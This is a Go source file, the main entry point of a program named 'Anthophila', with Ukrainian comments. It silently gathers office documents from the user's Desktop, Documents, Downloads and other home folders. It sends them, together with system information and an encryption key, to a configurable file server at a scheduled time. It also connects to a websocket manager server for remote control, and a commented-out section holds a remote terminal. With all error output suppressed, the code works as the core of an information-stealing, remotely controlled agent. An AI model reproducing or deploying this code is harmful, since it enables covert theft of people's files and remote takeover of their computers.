package main

import (
	"Anthophila/checkfile"
	"Anthophila/information"
	"Anthophila/management"
	"flag"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// ./your_program -file_server="localhost:9090" -manager_server="localhost:8080" -log_server="localhost:7070" -directories="/Users/sirius/GolandProjects/Anthophila/doc,/Users/sirius/GolandProjects/Anthophila/file" -extensions=".doc,.docx,.xls,.xlsx,.ppt,.pptx" -hour=12 -minute=45 -key="a very very very very secret key"
// ./your_program -file_server="localhost:9090" -manager_server="localhost:8080" -log_server="localhost:7070" -directories="?" -extensions=".doc,.docx,.xls,.xlsx,.ppt,.pptx" -hour=12 -minute=45 -key="a very very very very secret key"

var (
	fileServer    = flag.String("file_server", "localhost:9090", "File Server address")
	managerServer = flag.String("manager_server", "localhost:8080", "Manager Server address")
	logServer     = flag.String("log_server", "localhost:7070", "Log Server address")
	directories   = flag.String("directories", "", "Comma-separated list of directories")
	extensions    = flag.String("extensions", ".doc,.docx,.xls,.xlsx,.ppt,.pptx", "Comma-separated list of extensions")
	hour          = flag.Int("hour", 12, "Hour")
	minute        = flag.Int("minute", 30, "Minute")
	key           = flag.String("key", "a very very very very secret key", "Encryption key")
)

func main() {
	flag.Parse()

	// Зчитування конфігурації з файлу
	config, err := loadConfig()
	if err != nil {
		//fmt.Printf("Error loading config: %v\n", err)
		return
	}

	// Отримання домашньої директорії користувача
	homeDir, err := os.UserHomeDir()
	if err != nil {
		//fmt.Printf("Error getting home directory: %v\n", err)
		return
	}
	// Формування списку директорій
	var dirs []string
	// Якщо параметр directories пустий або має значення "?", додаємо стандартні користувацькі директорії
	if *directories == "" || *directories == "?" {
		dirs = []string{
			filepath.Join(homeDir, "Desktop/"),
			filepath.Join(homeDir, "Documents/"),
			filepath.Join(homeDir, "Music/"),
			filepath.Join(homeDir, "Public/"),
			filepath.Join(homeDir, "Downloads/"),
		}
	} else {
		// Інакше використовуємо директорії, передані як параметр
		dirs = strings.Split(*directories, ",")
	}
	// Створення нового об'єкта конфігурації на основі параметрів командного рядка
	newConfig := &Config{
		FileServer:    *fileServer,
		ManagerServer: *managerServer,
		LogServer:     *logServer,
		Directories:   dirs,
		Extensions:    strings.Split(*extensions, ","),
		Hour:          *hour,
		Minute:        *minute,
		Key:           *key,
	}

	// Порівняння існуючої конфігурації з новою конфігурацією
	if config == nil ||
		config.FileServer != newConfig.FileServer ||
		config.ManagerServer != newConfig.ManagerServer ||
		config.LogServer != newConfig.LogServer ||
		strings.Join(config.Directories, ",") != strings.Join(newConfig.Directories, ",") ||
		strings.Join(config.Extensions, ",") != strings.Join(newConfig.Extensions, ",") ||
		config.Hour != newConfig.Hour ||
		config.Minute != newConfig.Minute ||
		config.Key != newConfig.Key {

		if err := saveConfig(newConfig); err != nil {
			//fmt.Printf("Error saving config: %v\n", err)
			return
		}
	}

	// Виведення конфігурації
	/*
		fmt.Println("File Server Address:", newConfig.FileServer)
		fmt.Println("Manager Server Address:", newConfig.ManagerServer)
		fmt.Println("Log Server Address:", newConfig.LogServer)
		fmt.Println("Directories:", newConfig.Directories)
		fmt.Println("Extensions:", newConfig.Extensions)
		fmt.Println("Hour:", newConfig.Hour)
		fmt.Println("Minute:", newConfig.Minute)
		fmt.Println("Key:", newConfig.Key)
	*/

	// Ініціалізація та запуск FileChecker
	infoJson := information.NewInfo().InfoJson()
	fileChecker := checkfile.FileChecker{
		FileAddress:         newConfig.FileServer,
		LogAddress:          newConfig.LogServer,
		Key:                 []byte(newConfig.Key),
		Directories:         newConfig.Directories,
		SupportedExtensions: newConfig.Extensions,
		TimeStart:           []int8{int8(newConfig.Hour), int8(newConfig.Minute)},
		InfoJson:            infoJson,
	}
	fileChecker.Start()

	// Ініціалізація та запуск Manager
	serverAddr := "ws://" + newConfig.ManagerServer + "/ws"
	manager := management.Manager{}
	manager.Start(false, newConfig.LogServer, serverAddr)

	for {
		//fmt.Println("Main goroutine continues...")
		time.Sleep(time.Second) // Затримка для основного циклу
	}

	/*
		// Створюємо новий об'єкт TerminalManager
		terminal := terminal.NewTerminalManager()

		// Запускаємо термінал
		terminal.Start()

		// Запускаємо горутину для обробки виходу терміналу
		go func() {
			for line := range terminal.GetOutput() {
				fmt.Printf("Terminal > %s", line) //./sudo_expect.sh

			}
		}()

		// Основний цикл для взаємодії з користувачемCTR^C
		scanner := bufio.NewScanner(os.Stdin)
		for {
			if scanner.Scan() {
				command := scanner.Text()
				if strings.TrimSpace(command) == "exit" {
					terminal.Stop()
					break
				}
				terminal.SendCommand(command)
			}
			if err := scanner.Err(); err != nil {
				fmt.Fprintln(os.Stderr, "Error reading from stdin:", err)
				break
			}
		}

		fmt.Println("Exiting...")

	*/

}
